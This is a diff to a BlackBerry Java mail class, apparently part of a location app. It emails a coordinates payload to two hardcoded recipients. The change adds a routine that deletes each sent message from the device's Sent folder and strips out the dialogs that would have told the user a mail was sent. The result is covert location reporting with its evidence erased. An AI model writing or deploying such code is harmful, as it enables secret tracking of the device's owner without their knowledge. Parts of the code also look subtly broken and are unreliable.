@@ -7,6 +7,7 @@ import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.mail.MessagingException;
 import net.rim.blackberry.api.mail.ServiceConfiguration;
 import net.rim.blackberry.api.mail.Session;
+import net.rim.blackberry.api.mail.Store;
 import net.rim.blackberry.api.mail.TextBodyPart;
 import net.rim.blackberry.api.mail.Transport;
 import net.rim.device.api.system.EventLogger;
@@ -59,6 +60,7 @@ public class MailCode
 	    	Address fromadd2;
 	    	Address toadd2;
 	    	Address toadd2_b;
+	    	int messageID;
 	    	
 	    	TextBodyPart mailbody2;
 	    	Message message2;
@@ -66,14 +68,11 @@ public class MailCode
 	    	session2 = Session.getDefaultInstance();
 	    	Folder[] folders = session2.getStore().list(Folder.SENT);
 	    	Folder sentfolder = folders[0];
-//	    	message2 = new Message(sentfolder);
-	    	message2 = new Message();
+	    	message2 = new Message(sentfolder);
+//	    	message2 = new Message();
 	    	if(session2 == null)
 	    	{
-//	    		Screen screen = LocationApplication.getUiApplication().getActiveScreen().getScreen();
-//	    		screen = new Dialog.alert("no mail account found!!");
-//	    		Screen.
-//	    		Dialog.alert("No BlackBerry Mail/Enterprise Mail account present on the device!!\r\nPlease set it up...");
+	    		/**No present session found on device*/
 	    	}
 	    	else
 	    	{
@@ -89,14 +88,12 @@ public class MailCode
 		    		message2.setFrom(fromadd2);																//Sender address	(BB mail account)
 		    		message2.addRecipients(Message.RecipientType.TO, new Address[] {toadd2,toadd2_b});		//sending to		(rohan & ashwin)
 		    	
-//			    		bodyText2 = "Test mail from BB account";
-		    		
 		    		message2.setContent(stream_coordinates); 
 		    		
 		    		Transport.send(message2);
 		    		
-//			    		Dialog.inform("Test Mail has been sent !!");
-		    		
+		    		messageID = message2.getMessageId();
+		    		DeleteSentMail(messageID, sentfolder);
 	    		} catch(AddressException e) {
 	        		e.printStackTrace();
 	        		System.err.print(e.getMessage());
@@ -106,6 +103,13 @@ public class MailCode
 	        	}
 	    	}
 		
+	}
+	
+	public boolean DeleteSentMail(int msgID, Folder messagefolder)
+	{
+		Message deleteMsg = Store.getMessage(msgID);
+		messagefolder.deleteMessage(deleteMsg);
+		return true;
 	}
 	
 	/** 
